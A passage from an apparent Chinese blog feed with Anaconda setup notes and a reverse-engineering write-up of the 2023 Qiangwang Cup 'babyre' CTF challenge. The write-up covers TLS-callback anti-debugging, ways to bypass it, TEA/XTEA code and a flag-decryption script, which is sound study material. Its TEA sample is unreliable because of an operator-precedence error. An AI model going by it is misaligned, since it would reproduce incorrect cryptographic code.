    <content type="html"><![CDATA[<p>老是忘，浅浅记录一下</p><span id="more"></span><h3 id="Anaconda安装配置"><a href="#Anaconda安装配置" class="headerlink" title="Anaconda安装配置"></a>Anaconda安装配置</h3><p>下载链接：</p><p><a href="https://www.anaconda.com/download/">官网</a></p><p>双击anaconda.exe直接运行安装包，一直Next到下图位置：</p><p>第一个选项是添加环境变量，默认是没有勾选的，请务必勾选上，如果这里不勾选，后续安装完成后要自行添加环境变量</p><img src="/2024/01/26/Anaconda%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Snipaste_2024-05-21_13-56-15.png" class=""><p>1.修改为清华源<br>直接打开cmd输入以下命令<br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</a><br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</a><br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud//pytorch/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud//pytorch/</a><br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</a><br>conda config –set show_channel_urls yes<br>2.移除清华源<br>输入：conda config –remove channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</a><br>这个命令是为了移除之前conda config –show channels显示的清华源。</p><h3 id="Anaconda使用"><a href="#Anaconda使用" class="headerlink" title="Anaconda使用"></a>Anaconda使用</h3><p>主要用的两个为Anaconda Prompt 和Anaconda Navigator</p><p><code>conda info</code>查看当前环境的信息</p><p><code>conda</code>配置新环境</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> CONDA_FORCE_32BIT=1 <span class="hljs-comment"># 切换到32位</span><br><span class="hljs-built_in">set</span> CONDA_FORCE_32BIT=0 <span class="hljs-comment"># 切换到64位</span><br>conda create -n pytorch python=3.10<br>conda <span class="hljs-built_in">env</span> list<br>conda activate pytorch<br>conda install matplotlib<br></code></pre></td></tr></table></figure><p><code>conda create -n xxx python=2.7</code>创建一个python2.7 名为xxx的虚拟环境，如要创建32位的python环境，先设置为32位在创建环境，这样创建好的环境即为32位的Python环境，先切换到创建好的环境中，然后输入python 检查下是否为32位的python2.7版本</p><p>在<code>pycharm</code>中使用<code>conda</code>环境：</p><p>在创建新的项目时，选择先前配置的解释器，然后选择自己已经配置好的<code>conda</code>环境即可。</p><img src="/2024/01/26/Anaconda%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Snipaste_2024-01-26_14-06-38.png" class=""><h3 id="解决Powershell中无法切换环境问题"><a href="#解决Powershell中无法切换环境问题" class="headerlink" title="解决Powershell中无法切换环境问题"></a>解决Powershell中无法切换环境问题</h3><p>在terminal中输入然后重新打开</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda init powershell<br></code></pre></td></tr></table></figure><h3 id="解决conda新环境pip出现SSLError"><a href="#解决conda新环境pip出现SSLError" class="headerlink" title="解决conda新环境pip出现SSLError"></a>解决conda新环境pip出现SSLError</h3><p>大概率是因为开了全局代理，证书不安全导致，关闭系统代理即可</p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023强网杯babyre</title>
    <link href="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/"/>
    <url>/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/</url>
    
    <content type="html"><![CDATA[<p>这道题比赛的时候做了半天也没有做出了，加密部分倒是搞懂了，就是得不到正确的flag</p><span id="more"></span><h3 id="做题前置知识"><a href="#做题前置知识" class="headerlink" title="做题前置知识"></a>做题前置知识</h3><h4 id="TLS反调试机制"><a href="#TLS反调试机制" class="headerlink" title="TLS反调试机制"></a>TLS反调试机制</h4><p><a href="https://www.52pojie.cn/thread-1490663-1-1.html">参考文章1</a></p><p><a href="https://www.cnblogs.com/helloylh/p/17209669.html">参考文章2</a></p><p><code>TLS</code>是<code>Thread Local Storage</code>的缩写，即线程局部存储。<strong>主要是为了解决多线程中变量同步的问题</strong>。</p><p>根据我们所学习的<code>OS</code>的知识，进程中的全局变量和函数内的静态变量，是各个线程都可以访问的共享变量，即<code>线程a</code>修改后，<code>线程b</code>访问时就不是原来的了，当然<code>OS</code>利用信号量解决这种同步问题。</p><p>这造成昂贵的同步开销，所以我们选择一种方式使得每个线程可以保有自己的内部变量，被称为<code>static memory local to a thread</code>线程局部静态变量。这一种新的实现机制就是<code>TLS</code></p><p>强网杯这道题具体用的应该是静态绑定</p><p>那么关于TLS在C++中的具体实现应该如下：</p><ol><li><p>编译器声明使用TLS回调</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64       <span class="hljs-comment">//64位</span></span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">"/INCLUDE:_tls_used"</span>)  </span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">"/INCLUDE:tls_callback_func"</span>) </span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span>               <span class="hljs-comment">//32位</span></span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">"/INCLUDE:__tls_used"</span>) </span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">"/INCLUDE:_tls_callback_func"</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li><li><p>编写TLS回调函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> NTAPI <span class="hljs-title">tls_callback</span><span class="hljs-params">(PVOID Dllhandle, DWORD Reason, PVOID Reserved)</span> </span>{<br>    BOOL ret;<br>    <span class="hljs-built_in">CheckRemoteDebuggerPresent</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), &amp;ret);<span class="hljs-comment">//检测是否被调试</span><br>    <span class="hljs-keyword">if</span> (ret) {<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//退出程序</span><br>    }   <br>}<br></code></pre></td></tr></table></figure></li><li><p>注册TLS回调函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64                           <span class="hljs-comment">//64位</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> const_seg(<span class="hljs-string">".CRT$XLF"</span>)</span><br>    EXTERN_C <span class="hljs-type">const</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg(<span class="hljs-string">".CRT$XLF"</span>)        <span class="hljs-comment">//32位</span></span><br>    EXTERN_C<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>PIMAGE_TLS_CALLBACK tls_callback_func[] = { tls_callback,<span class="hljs-number">0</span> };<br><span class="hljs-comment">//这里是个回调函数数组，可以定义多个，可以为空，0必须加上用于结束</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64                           <span class="hljs-comment">//64位</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> const_seg()</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg()                  <span class="hljs-comment">//32位</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">//_WIN64</span></span><br></code></pre></td></tr></table></figure></li></ol><p>至于TLS在程序运行过程中的变化应该是这样的：</p><ol><li><strong>OS加载可执行文件，查找所有TLS回调函数，不用从OEP进去后到主线程执行</strong></li><li><strong>OS在重新启动时（或者线程创建销毁），调用TLS回调函数</strong></li><li><strong>进入（返回）主函数</strong></li></ol><h4 id="TEA加密算法"><a href="#TEA加密算法" class="headerlink" title="TEA加密算法"></a>TEA加密算法</h4><p><a href="https://www.cnblogs.com/zpchcbd/p/15974293.html">参考文章</a></p><p>算法特点：</p><ol><li>使用64位(8byte)明文分组和128位密钥(4*32bit,通常是4个8byte数组)</li><li>sum是用于每轮混淆，每次加δ</li><li>使用Feistel分组加密框架（使用上一轮生成的数据和原始数据的另一半进行XOR异或操作，作为下一轮轮函数的输入），一般为32轮</li></ol><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_15-20-48.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> delta 0x9E3779B9 <span class="hljs-comment">//常数Delta</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// 加密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *EntryData,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>{<br>    <span class="hljs-comment">// 根据算法，分为8字节一轮</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = EntryData[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = EntryData[<span class="hljs-number">1</span>];<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++){<br>        sum += delta;<br>        v0 += (v1&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">0</span>])^(v1 + sum)^(v1&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">1</span>]);<br>        v1 += (v0&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">2</span>])^(v0 + sum)^(v0&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">3</span>]);<br>    }<br>    EntryData[<span class="hljs-number">0</span>] = v0;<br>    EntryData[<span class="hljs-number">1</span>] = v1;<br>}<br><span class="hljs-comment">// 解密，加密反过来就行</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Encrypted_data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = delta*<span class="hljs-number">32</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++){<br>        <span class="hljs-comment">// 先算v1</span><br>        v1 -= (v0&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">2</span>])^(v0 + sum)^(v0&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">3</span>]);<br>        v0 -= (v1&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">0</span>])^(v1 + sum)^(v1&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">1</span>]);<br>        sum -= delta;<br>    }<br>    Encrypted_data[<span class="hljs-number">0</span>] = v0;<br>    Encrypted_data[<span class="hljs-number">1</span>] = v1;<br>}<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Data[<span class="hljs-number">3</span>]={<span class="hljs-number">0x48535833</span>,<span class="hljs-number">0x21455230</span>,<span class="hljs-number">0x0</span>};<br>    cout &lt;&lt; <span class="hljs-string">"明文："</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  Key[<span class="hljs-number">4</span>] = { <span class="hljs-number">0x212A3D44</span>,<span class="hljs-number">0x15667788</span>,<span class="hljs-number">0x92AABBCC</span>,<span class="hljs-number">0xD12EFF11</span>};<br>    <span class="hljs-built_in">Encrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">"密文："</span> &lt;&lt; *Data &lt;&lt;<span class="hljs-string">" "</span>&lt;&lt; *(Data+<span class="hljs-number">1</span>) &lt;&lt;endl;<br>    <span class="hljs-built_in">Decrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">"明文："</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>}<br></code></pre></td></tr></table></figure><h4 id="XTEA加密算法"><a href="#XTEA加密算法" class="headerlink" title="XTEA加密算法"></a>XTEA加密算法</h4><p>XTEA（TEAN）算法相比于TEA的改变在于：<strong>取哪一个密钥通过sum计算得到，而TEA是固定下标</strong></p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_21-49-41.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> delta 0x9E3779B9</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// 加密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = Data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = Data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++){<br>        v0 += ((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>) + v1) ^ (sum + Key[sum&amp;<span class="hljs-number">3</span>]);<span class="hljs-comment">//sum&amp;3:00,01,11</span><br>        sum += delta;<br>        v1 += ((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>) + v0) ^ (sum + Key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<span class="hljs-comment">//将sum高五位中的低两位获取</span><br>    }<br>    Data[<span class="hljs-number">0</span>] = v0;<br>    Data[<span class="hljs-number">1</span>] = v1;<br>}<br><span class="hljs-comment">// 解密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Encrypted_data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = delta*<span class="hljs-number">32</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 =Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 =Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++){<br>        v1 -= ((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>) + v0) ^ (sum + Key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<br>        sum -= delta;<br>        v0 -= ((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>) + v1) ^ (sum + Key[sum&amp;<span class="hljs-number">3</span>]);<br>    }<br>    Encrypted_data[<span class="hljs-number">0</span>] = v0;<br>    Encrypted_data[<span class="hljs-number">1</span>] = v1;<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<br>    cout&lt;&lt; <span class="hljs-string">"这是XTEA算法!"</span>&lt;&lt;endl;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Data[<span class="hljs-number">3</span>]={<span class="hljs-number">0x48535833</span>,<span class="hljs-number">0x21455230</span>,<span class="hljs-number">0x0</span>};<br>    cout &lt;&lt; <span class="hljs-string">"明文："</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  Key[<span class="hljs-number">4</span>] = { <span class="hljs-number">0x212A3D44</span>,<span class="hljs-number">0x15667788</span>,<span class="hljs-number">0x92AABBCC</span>,<span class="hljs-number">0xD12EFF11</span>};<br>    <span class="hljs-built_in">Encrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">"密文："</span> &lt;&lt; *Data &lt;&lt;<span class="hljs-string">" "</span>&lt;&lt; *(Data+<span class="hljs-number">1</span>) &lt;&lt;endl;<br>    <span class="hljs-built_in">Decrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">"明文："</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>}<br></code></pre></td></tr></table></figure><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_21-49-02.png" class=""><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><h4 id="解决TLS反调试"><a href="#解决TLS反调试" class="headerlink" title="解决TLS反调试"></a>解决TLS反调试</h4><p>首先我们已经知道了这道题加了TLS反调试，然后学习了具体的原理，现在就是实践中去摸索到底时如何实现的。</p><h5 id="寻觅TLS"><a href="#寻觅TLS" class="headerlink" title="寻觅TLS"></a>寻觅TLS</h5><p>打开IDA调试，首先我们进入到程序入口位置，</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-21_22-01-41.png" class=""><p>然后一直点击到内层函数，直到此处，重命名为<code>check_DBG</code>，点击进去分析就知道为啥这里是了</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-21_22-03-02.png" class=""><p>然后里面是这样的：这里已经很明显用了<code>TLS</code>反调试了，如果返回值表示正在被调试，那么直接退出进程；反之才会进入我们的<code>encrypt_func()</code></p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-21_22-05-35.png" class=""><p>当然为了更加确认，我们可以在IDA中搜索字符串，发现一个<code>SomeThing Go Wrong\n</code>，点击到该处位置，对函数按<code>x</code>发现交叉引用，发现在两个<code>TLS</code>的<code>callback</code>函数。</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_10-59-22.png" class=""><p>点击到一个回调函数分析：和我上面列举的<code>TLS</code>反调试例子就很像了</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_11-06-42.png" class=""><p>所以可以发现，<strong>如果存在<code>tlsCallback_</code>之类的函数就得小心了，IDA按<code>shift+F7</code>查看代码段，如果存在<code>.tls</code>也得小心了</strong></p><h5 id="反反调试"><a href="#反反调试" class="headerlink" title="反反调试"></a>反反调试</h5><p>至此我们确定<code>babyre</code>这道题使用了<code>TLS</code>来反调试，那么接下来的问题就是如何反反调试，<strong>这里首先有个简单的方法，首先自己运行程序，然后用x64dbg附加进程，就可以动态调试了，但是这样不太方便，每次都要重新跑程序。</strong></p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_17-01-58.png" class=""><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_17-02-28.png" class=""><p>通过上面的方法拿到的密文和密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">E0 F2 23 95 93 C2 D8 8E 93 C3 68 86 BC 50 F2 DD<br>99 44 0E 51 44 BD 60 8C F2 AB DC 34 60 D2 0F C1<br><br>62 6F 6D 62<br></code></pre></td></tr></table></figure><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_15-12-03.png" class=""><p>这里采用修改汇编代码的方式把反调试给patch掉，笔者也是第一次做这种操作，太菜了😭</p><p>首先需要定位到在哪里我们可以进入正常的加密算法，在上面我们已经分析出来了，就在我们重命名的<code>check_DBG</code>函数里，接下来计算地址，</p><p>(期末考试ing，未完待续)</p><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><p>进入主逻辑中的加密算法，首先有0-1、2-3、4-5、6-7两个一组进去加密，根据我们刚刚拿到的密文，可以发现就是一共4组，每组64bit，和上面的TEA和XTEA的输入要求是一样。</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_22-01-37.png" class=""><p>进入函数分析，发现确实就是一个魔改过的XTEA算法，具体在轮数是33，加密方式变为<code>(v1*5)^(v1&gt;&gt;4)</code>，其他的大差不差的😋</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_22-09-55.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Encrypted_data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>{<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">0x90508D47</span> - delta*<span class="hljs-number">33</span>*<span class="hljs-number">4</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">33</span>;i++){<br>        sum += delta;<br>        v1 -= ((<span class="hljs-number">32</span>*v0)^(v0&gt;&gt;<span class="hljs-number">4</span>) + v0) ^ (sum + Key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        v0 -= ((<span class="hljs-number">32</span>*v1)^(v1&gt;&gt;<span class="hljs-number">4</span>) + v1) ^ (sum + Key[sum &amp; <span class="hljs-number">3</span>]) ^ sum;<br>    }<br>}<br></code></pre></td></tr></table></figure><p>下面就是魔改后的XTEA算法的解密脚本，然后在主函数中发现之后还有一个切割逻辑，方便和答案比较，在实际的解密脚本中无需太过关心。</p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-03_15-27-02.png" class=""><p>下面是完整脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> delta 0x77BF7F99</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">uint32_t</span> Key[<span class="hljs-number">4</span>] = {<span class="hljs-number">0x62</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x62</span>};<br><span class="hljs-type">unsigned</span> <span 